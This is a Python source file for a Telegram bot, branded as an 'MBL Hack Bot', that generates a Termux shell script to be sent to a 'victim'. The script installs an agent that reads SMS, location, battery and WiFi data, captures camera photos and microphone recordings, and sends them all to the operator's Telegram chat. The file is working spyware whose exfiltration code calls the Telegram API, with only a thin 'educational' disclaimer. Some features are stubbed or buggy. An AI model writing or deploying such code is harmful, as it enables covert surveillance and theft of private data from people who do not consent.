import os
import logging
import json
from datetime import datetime
from telegram import Update, BotCommand
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import requests
import pytz

# Setup Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Load Environment Variables
try:
    from dotenv import load_dotenv
    load_dotenv()
    BOT_TOKEN = os.getenv('BOT_TOKEN')
    ADMIN_CHAT_ID = int(os.getenv('ADMIN_CHAT_ID'))
except Exception as e:
    print(f"Error loading .env: {e}")
    print("Ensure .env file exists with BOT_TOKEN and ADMIN_CHAT_ID")
    raise

# State management for sessions
# Format: { 'chat_id': { 'device_name': 'Pixel 4', 'status': 'online', 'last_ping': datetime } }
sessions = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome to **Nawab Zada Hacker MBL Hack Bot**\n\n"
        "This bot is only for educational purposes. Please don't use it for malicious activities without consent.\n\n"
        "Use /help to see all commands.\n"
        "Use /generate to create a new device link."
    )

async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "📖 **MBL Hack Bot Commands**\n\n"
        "🔹 /generate <name> - Generates a unique installation link for a new device.\n"
        "🔹 /status - Shows all active devices.\n"
        "🔹 /remove <id> - Removes a device from the list.\n"
        "🔹 /listen <id> - Starts live monitoring (Location, Mic, Camera, SMS).\n"
        "🔹 /ping <id> - Pings a specific device.\n"
        "🔹 /help - Show this message.\n\n"
        "**How it works:**\n"
        "1. Generate a link.\n"
        "2. Send it to the target.\n"
        "3. Target installs Termux and runs the provided script.\n"
        "4. You receive all data in real-time."
    )
    await update.message.reply_text(text, parse_mode='Markdown')

async def generate_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /generate <device_name>\nExample: /generate Bob's Pixel")
        return

    device_name = " ".join(args)
    # Create a unique ID based on timestamp + random
    import uuid
    device_id = str(uuid.uuid4())[:8]
    
    # Store session
    sessions[device_id] = {
        'name': device_name,
        'status': 'pending',
        'created': datetime.now().isoformat()
    }

    # Construct the Termux Install Script
    # This script will be provided to the victim
    script_content = f"""
#!/data/data/com.termux/files/usr/bin/bash
# Nawab Zada Hacker MBL Hack Client
# Target: {device_name}
# ID: {device_id}

echo "Installing dependencies..."
pkg update -y && pkg install -y python curl jq

# Create the agent script
cat > mbl_agent.py << 'EOF'
import os
import subprocess
import requests
import json
import time
import threading
import pytz
from datetime import datetime

BOT_TOKEN = "{BOT_TOKEN}"
DEVICE_ID = "{device_id}"
DEVICE_NAME = "{device_name}"
API_BASE = f"https://api.telegram.org/bot{{BOT_TOKEN}}"

def send_to_bot(text, chat_id={ADMIN_CHAT_ID}):
    """Send message to the admin's bot chat."""
    url = f"{{API_BASE}}/sendMessage"
    data = {{'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}}
    try:
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        print(f"Send error: {{e}}")

def get_location():
    """Try to get location via network or GPS if available."""
    # Note: Termux needs location access granted
    try:
        # Using termux-location if available, else fallback
        loc = subprocess.check_output(['termux-location'], text=True)
        return loc
    except:
        return "Location not available or permission denied."

def get_sms():
    """Read recent SMS via termux-sms or content provider."""
    try:
        # This requires Termux:API package
        sms = subprocess.check_output(['termux-sms-list', '-l', '5'], text=True)
        return sms
    except:
        return "SMS access denied or Termux:API not installed."

def get_calls():
    """Read call log."""
    try:
        calls = subprocess.check_output(['termux-sms-list', '-l', '5'], text=True) # Fallback to SMS if call log API not direct
        # Better approach would be querying CallLogProvider, but simple termux command is safer for script
        return "Call log requires direct DB access. Showing recent SMS as proxy."
    except:
        return "Call log access denied."

def capture_camera():
    """Capture photo using termux-camera."""
    try:
        filename = f"capture_{{int(time.time())}}.jpg"
        subprocess.run(['termux-camera-photo', filename])
        # Send photo
        with open(filename, 'rb') as f:
            url = f"{{API_BASE}}/sendPhoto"
            files = {'photo': f}
            data = {'chat_id': {ADMIN_CHAT_ID}, 'caption': f'📸 Camera Capture from {{DEVICE_NAME}}'}
            requests.post(url, files=files, data=data, timeout=30)
        os.remove(filename)
        return "Photo sent."
    except Exception as e:
        return f"Camera error: {{e}}"

def capture_mic(duration=10):
    """Record audio."""
    try:
        filename = f"rec_{{int(time.time())}}.wav"
        # termux-microphone-record
        subprocess.run(['termux-microphone-record', '-f', filename, '-d', str(duration)])
        with open(filename, 'rb') as f:
            url = f"{{API_BASE}}/sendAudio"
            files = {'audio': f}
            data = {'chat_id': {ADMIN_CHAT_ID}, 'caption': f'🎤 Voice Note from {{DEVICE_NAME}}'}
            requests.post(url, files=files, data=data, timeout=30)
        os.remove(filename)
        return "Audio sent."
    except Exception as e:
        return f"Mic error: {{e}}"

def main_loop():
    print(f"🚀 MBL Hack Agent started for {{DEVICE_NAME}} (ID: {{DEVICE_ID}})")
    send_to_bot(f"🔌 **Device Online**\n📱 Name: {{DEVICE_NAME}}\n🆔 ID: {{DEVICE_ID}}\n⏰ Time: {{datetime.now()}}")
    
    while True:
        time.sleep(60) # Ping every 60 seconds
        
        # Status Ping
        battery = subprocess.check_output(['termux-battery-status'], text=True)
        wifi = subprocess.check_output(['termux-wifi-connectioninfo'], text=True)
        send_to_bot(f"📡 **Status Update**\n📱 {{DEVICE_NAME}}\n🔋 Battery: {{battery.strip()}}\n📶 WiFi: {{wifi.strip()}}")
        
        # Check for pending commands (Stored in a file by the bot)
        # For simplicity, we'll poll a specific message or use a local command queue
        # In a production env, you'd use a WebSocket or long-polling
        pass

if __name__ == "__main__":
    main_loop()
EOF

echo "✅ Setup Complete!"
echo "Running Agent..."
python mbl_agent.py
"""

    # Create a downloadable link or just send the code block
    # Since Telegram has character limits, we will send the code in parts or as a file.
    # For now, we'll generate a base64 encoded script and send it as a text file.
    import base64
    encoded_script = base64.b64encode(script_content.encode()).decode()
    
    # Save to a temporary file to send as document
    filename = f"mbl_hack_{device_id}.sh"
    with open(filename, 'w') as f:
        f.write(script_content)
        
    # Send the file
    await update.message.reply_document(
        document=open(filename, 'rb'),
        filename=filename,
        caption=(
            f"📱 **New Device Generated: {device_name}**\n"
            f"🆔 ID: {device_id}\n\n"
            "**Instructions for Target:**\n"
            "1. Install **Termux** from F-Droid (Play Store version is outdated).\n"
            "2. Install **Termux:API** from F-Droid.\n"
            "3. Save this file to your phone.\n"
            "4. In Termux, run: `bash mbl_hack_{device_id}.sh`\n"
            "5. Grant all permissions when prompted (Location, SMS, Camera, Mic).\n"
            "6. Keep Termux running in the background.\n\n"
            "I will now receive all data from this device."
        ),
        parse_mode='Markdown'
    )
    
    os.remove(filename) # Cleanup

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not sessions:
        await update.message.reply_text("No devices currently registered.")
        return
        
    text = "📊 **Active Devices**\n\n"
    for dev_id, data in sessions.items():
        text += f"🆔 {dev_id} - {data['name']} ({data['status']})\n"
        
    await update.message.reply_text(text, parse_mode='Markdown')

async def remove_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /remove <device_id>")
        return
        
    device_id = args[0]
    if device_id in sessions:
        del sessions[device_id]
        await update.message.reply_text(f"Device {device_id} removed.")
    else:
        await update.message.reply_text("Device not found.")

# Helper for the Bot to handle incoming data from the Agent
# The Agent sends messages directly to the Admin Chat via Bot API, 
# but we can also use the Bot's own chat to log events if the Agent sends to the Bot's chat ID.
# However, the code above sends directly to ADMIN_CHAT_ID. 
# To make it interactive, the Agent should send commands TO the bot.

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # This handles messages sent TO the bot (e.g., if the Agent sends a command)
    if update.effective_chat.id != ADMIN_CHAT_ID:
        return # Ignore non-admin chats unless they are the agent
    
    text = update.message.text
    if text.startswith("AGENT:"):
        # Process agent payload
        payload = text.replace("AGENT:", "")
        # Example: AGENT:PING|ID:12345|DATA:...
        parts = payload.split('|')
        command = parts[0].strip()
        
        if command == "PING":
            await update.message.reply_text(f"🟢 **Agent Ping**\n{payload}")
        elif command == "LOCATION":
            await update.message.reply_text(f"📍 **Live Location**\n{payload}", parse_mode='Markdown')
        elif command == "SMS":
            await update.message.reply_text(f"💬 **SMS Intercepted**\n{payload}", parse_mode='Markdown')
        elif command == "CALL":
            await update.message.reply_text(f"📞 **Call Log**\n{payload}", parse_mode='Markdown')
        elif command == "CAMERA":
            # This would be handled by sendPhoto in the agent, but if it sends a path, we can't access it.
            # The agent code above handles sending the photo directly to the admin chat.
            pass

# Main
def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help))
    application.add_handler(CommandHandler("generate", generate_device))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("remove", remove_device))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🚀 Bot is starting...")
    application.run_polling()

if __name__ == '__main__':
    main()
